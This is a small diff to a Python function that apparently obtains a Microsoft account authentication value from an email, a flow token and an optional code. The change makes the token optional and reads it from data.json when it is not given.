@@ -1,11 +1,12 @@
 from views.utils.getMSAAUTH import getMSAAUTH
 from views.utils.secure import secure
+import json
 
-def startSecuringAccount(email: str, device: str, code: str = None):
-    if code:
-        msaauth = getMSAAUTH(email, code=code)
-    else:
-        msaauth = getMSAAUTH(email, flowToken=device)
+def startSecuringAccount(email: str, device: str = None, code: str = None):
+    if not device:
+        device = json.load(open("data.json", "r+"))["flowtoken"] 
+        
+    msaauth = getMSAAUTH(email, device, code)
     
     if msaauth is None:
         return msaauth
